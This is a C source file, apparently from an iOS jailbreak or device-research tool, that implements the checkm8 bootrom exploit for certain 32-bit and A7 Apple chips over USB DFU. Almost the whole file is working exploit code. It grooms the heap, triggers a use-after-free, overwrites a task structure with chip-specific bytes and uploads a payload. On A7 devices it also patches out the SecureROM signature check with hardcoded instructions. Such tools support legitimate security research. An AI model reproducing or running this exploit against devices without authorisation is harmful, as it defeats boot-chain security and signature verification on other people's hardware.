/*
 * boot.c
 * copyright (C) 2021/01/22 dora2ios
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <ircv.h>
#include <checkm8.h>


// Log
static int empty(void){
    return 0;
}
#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif


// usb
unsigned char blank_buf[0x100];

static int usb_req_stall(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

static int usb_req_leak(irecv_client_t client){
    //unsigned char buf[0x40];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 1);
}

static int usb_req_leak_fast(irecv_client_t client){
    //unsigned char buf[0x40];
    irecv_async_usb_control_transfer_with_cancel(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 100000); // fast dfu
    return IRECV_E_TIMEOUT;
}

static int usb_req_no_leak(irecv_client_t client){
    //unsigned char buf[0x41];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x41, 1);
}

static int send_data(irecv_client_t client, unsigned char* data, size_t size){
    return irecv_usb_control_transfer(client, 0x21, 1, 0, 0, data, size, 100);
}


// payload
#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE
#define S5l8960X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
    switch(cpid) {
        case 0x8950:
            config->large_leak = 659;
            config->overwrite_offset = 0x640;
            config->overwrite = S5l8950X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8955:
            config->large_leak = 659;
            config->overwrite_offset = 0x640;
            config->overwrite = S5l8955X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8960:
            config->large_leak = 7936;
            config->overwrite_offset = 0x580;
            config->overwrite = S5l8960X_OVERWRITE;
            config->overwrite_len = 0x30;
            return 0;
        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}


// exploit
int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const struct irecv_device_info *info) {
    
    int r;
    if(!info->cpid){
        printf("\x1b[31mERROR: Failed to get device info.\x1b[39m\n");
        irecv_close(client);
        return -1;
    }
    uint16_t chipid = info->cpid;
    
#ifdef HAVE_DEBUG
    printf("\x1b[1m** \x1b[31mexploiting with checkm8\x1b[39;0m\n");
#else
    printf("\x1b[1m\x1b[31mexploiting with checkm8\x1b[39;0m\n");
#endif
    
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(pwnd_str) {
        printf("\x1b[31mThis device is already in pwned DFU mode!\x1b[39m\n");
        irecv_close(client);
        return 0;
    }
    
    unsigned char buf[0x800] = { 'A' };
    checkm8_32_t config;
    memset(&config, '\0', sizeof(checkm8_32_t));
    
    r = get_exploit_configuration(chipid, &config);
    if(r != 0) {
        printf("\x1b[31mERROR: Failed to get exploit configuration.\x1b[39m\n");
        irecv_close(client);
        return -1;
    }
    
    r = get_payload_configuration(chipid, device_info->product_type, &config);
    if(r != 0) {
        printf("\x1b[31mERROR: Failed to get payload configuration.\x1b[39m\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
    r = usb_req_stall(client);
    if(r != IRECV_E_PIPE) {
        printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
        return -1;
    }
    usleep(100);
    if(chipid == 0x8960){
        for(int i = 0; i < config.large_leak; i++) {
            r = usb_req_leak_fast(client);
        }
    } else {
        for(int i = 0; i < config.large_leak; i++) {
            r = usb_req_leak(client);
            if(r != IRECV_E_TIMEOUT) {
                printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
                return -1;
            }
        }
    }
    
    r = usb_req_no_leak(client);
    if(r != IRECV_E_TIMEOUT) {
        printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
        return -1;
    }
    
    irecv_reset(client);
    
    irecv_close(client);
    client = NULL;
    usleep(100);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
        return -1;
    }
    
    
    DEBUG_("\x1b[36mPreparing for overwrite\x1b[39m\n");
    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    
    DEBUG_("\x1b[37masync_transfer(): %x\x1b[39m\n", sent);
    
    if(sent < 0) {
        printf("\x1b[31mERROR: Failed to send bug setup.\x1b[39m\n");
        irecv_close(client);
        return -1;
    }
    if(chipid != 0x8960 && sent > config.overwrite_offset) {
        printf("\x1b[31mERROR: Failed to abort bug setup.\x1b[39m\n");
        irecv_close(client);
        return -1;
    }
    
    int overwriteOff;
    int overwriteTimeout;
    
    DEBUG_("\x1b[36mAdvance buffer offset before triggering the UaF to prevent trashing the heap\x1b[39m\n");
    DEBUG_("\x1b[37mRe-setting overwrite buffer offset\x1b[39m\n");
    if(chipid == 0x8960){
        // A7 Devices
        int val = 0x0;
        int origsent = sent;
        DEBUG_("\x1b[37mreceived val: %x\x1b[39m\n", sent);
        DEBUG_("\x1b[37mPreparing for calculating value\x1b[39m\n");
        
        /*
         received: 0x000 -> val: ?????
         received: 0x040 -> val: 0x000
         received: 0x080 -> val: 0x040
         received: 0x0c0 -> val: 0x000
         received: 0x100 -> val: 0x040
         received: 0x140 -> val: 0x080
         ...
         received: 0x600 -> val: 0x540
         received: 0x640 -> val: --
        */
        
        if((origsent % 0x40) == 0x0){
            if(origsent == 0x0){
                DEBUG_("\x1b[37mUnknown received value.\x1b[39m\n");
                val = 0x0;
            }
            if(origsent == 0x40){
                val = 0x0;
            }
            if(origsent == 0x80){
                val = 0x40;
            }
            if(origsent >= 0xc0){
                sent -= 0xc0;
                int i = 0;
                while(i != 1){
                    if(sent >= config.overwrite_offset){
                        val = 0;
                        break;
                    }
                    if(sent == 0x0){
                        val += 0;
                        break;
                    }
                    if(sent != 0x0){
                        val += 0x40;
                        sent -= 0x40;
                    }
                    if(sent < 0x0){
                        break;
                    }
                }
            }
        } else {
            DEBUG_("Unknown received value\n");
            if(origsent == 0x0){
                val = 0x0;
            }
            if(origsent == 0x40){
                val = 0x0;
            }
            if(origsent == 0x80){
                val = 0x40;
            }
            if(origsent >= 0xc0){
                sent -= 0xc0;
                val = sent;
                if(sent >= config.overwrite_offset){
                    val = 0;
                }
            } else {
                val = 0x0;
            }
        }
        
        DEBUG_("\x1b[34mreceived: 0x%03x -> val: 0x%03x\x1b[39m\n", origsent, val);
        DEBUG_("\x1b[37mnew value: %x\x1b[39m\n", val);
        DEBUG_("\x1b[37mSubtracting calculated value from overwrite buffer offset\x1b[39m\n");
        overwriteOff = config.overwrite_offset - val;
        overwriteTimeout = 100;
        
    } else {
        // A6
        DEBUG_("\x1b[37mvalue: %x\x1b[39m\n", sent);
        DEBUG_("\x1b[37mSubtracting value from overwrite buffer offset\x1b[39m\n");
        overwriteOff = config.overwrite_offset - sent;
        overwriteTimeout = 10;
    }
    
    DEBUG_("\x1b[37mnew offset: %x\x1b[39m\n", overwriteOff);
    DEBUG_("\x1b[36mpushing forward overwrite offset\x1b[39m\n");
    r = irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, overwriteOff, overwriteTimeout);
    if(r != IRECV_E_PIPE) {
        printf("\x1b[31mERROR: Failed to push forward overwrite offset.\x1b[39m\n");
        return -1;
    }
    
    usleep(100);
    
    r = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
    if(r != 0) {
        if (chipid == 0x8960){
            // A7
            //printf("\x1b[31mFailed to send abort? But maybe A7 is fine\x1b[39m\n");
        }
        else {
            printf("\x1b[31mERROR: Failed to send abort.\x1b[39m\n");
            return -1;
        }
    }
    
    irecv_close(client);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
        return -1;
    }
    
    DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
    r = usb_req_stall(client);
    if(r != IRECV_E_PIPE) {
        printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
        return -1;
    }
    usleep(100);
    r = usb_req_leak(client);
    if(r != IRECV_E_TIMEOUT) {
        printf("\x1b[31mERROR: Failed to create heap hole.\x1b[39m\n");
        return -1;
    }
    DEBUG_("\x1b[36mOverwriting task struct\x1b[39m\n");
    
    r = irecv_usb_control_transfer(client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
    if(r != IRECV_E_PIPE) {
        printf("\x1b[31mERROR: Failed to overwrite task.\x1b[39m\n");
        return -1;
    }
    
    DEBUG_("\x1b[36mUploading payload\x1b[39m\n");
    if(chipid == 0x8960){
        r = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
        if(r != IRECV_E_TIMEOUT) {
            printf("\x1b[31mERROR: Failed to upload payload.\x1b[39m\n");
            return -1;
        }
    } else {
        void *buff = malloc(config.payload_len);
        memcpy(buff, config.payload, config.payload_len);
        
        size_t len = 0;
        size_t size;
        size_t sent;
        while(len < config.payload_len) {
            size = ((config.payload_len - len) > 0x800) ? 0x800 : (config.payload_len - len);
            sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&buff[len], size, 100);
            len += size;
        }
        
        free(buff);
    }
    
    DEBUG_("\x1b[36mExecuting payload\x1b[39m\n");
    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
        return -1;
    }
    info = irecv_get_device_info(client);
    pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("\x1b[31mERROR: Device not in pwned DFU mode.\x1b[39m\n");
        return -1;
    }
    
    if(chipid == 0x8960){
        // SecureROM Signature check remover by Linus Henze
        DEBUG_("\x1b[36mRemoving SecureROM Signature check\x1b[39m\n");
        
        void *payload_writeSignature;
        unsigned char blank[16];
        bzero(blank, 16);
        uint64_t dfu_image_base      = 0x0000000180380000;
        uint64_t writeSignatureAddr1 = 0x00000001000054e4;
        uint64_t writeSignatureAddr2 = 0x00000001000054b4;
        
        irecv_reset(client);
        irecv_close(client);
        client = NULL;
        usleep(1000);
        irecv_open_with_ecid_and_attempts(&client, 0, 5);
        if(!client) {
            printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
            return -1;
        }
        
        payload_writeSignature = malloc(76);
        bzero(payload_writeSignature, 76);
        
        *((uint32_t*)(payload_writeSignature+ 0)) = MEMC;
        *((uint32_t*)(payload_writeSignature+ 4)) = MEMC;
        *((uint64_t*)(payload_writeSignature+16)) = writeSignatureAddr1;
        *((uint64_t*)(payload_writeSignature+24)) = dfu_image_base + 16 + (3 * 8); // load_base + 16 + (index * 4)
        *((uint64_t*)(payload_writeSignature+32)) = 1*4;
        *((uint32_t*)(payload_writeSignature+40)) = 0xd503201f; // nop
        
        send_data(client, blank, 16);
        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        send_data(client, payload_writeSignature, 44);
        
        irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, NULL, 0, 100);
        
        irecv_reset(client);
        irecv_close(client);
        client = NULL;
        usleep(1000);
        irecv_open_with_ecid_and_attempts(&client, 0, 5);
        if(!client) {
            printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
            return -1;
        }
        
        *((uint64_t*)(payload_writeSignature+16)) = writeSignatureAddr2;
        *((uint64_t*)(payload_writeSignature+32)) = 9*4;
        *((uint32_t*)(payload_writeSignature+40)) = 0x52800021; // mov w1, 1
        *((uint32_t*)(payload_writeSignature+44)) = 0x39029fe1; // strb w1, [sp,#0xA7]
        *((uint32_t*)(payload_writeSignature+48)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+52)) = 0x3902a7e1; // strb w1, [sp,#0xA9]
        *((uint32_t*)(payload_writeSignature+56)) = 0x3902abe1; // strb w1, [sp,#0xAA]
        *((uint32_t*)(payload_writeSignature+60)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+64)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+68)) = 0xd503201f; // nop
        *((uint32_t*)(payload_writeSignature+72)) = 0xd503201f; // nop
        
        send_data(client, blank, 16);
        irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
        send_data(client, payload_writeSignature, 76);
        
        irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, NULL, 0, 100);
        
        irecv_reset(client);
        irecv_close(client);
        client = NULL;
        usleep(1000);
        irecv_open_with_ecid_and_attempts(&client, 0, 5);
        if(!client) {
            printf("\x1b[31mERROR: Failed to reconnect to device.\x1b[39m\n");
            return -1;
        }
        
        free(payload_writeSignature);
        usleep(1000);
    }
    
    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
    irecv_close(client);
    return 0;
}
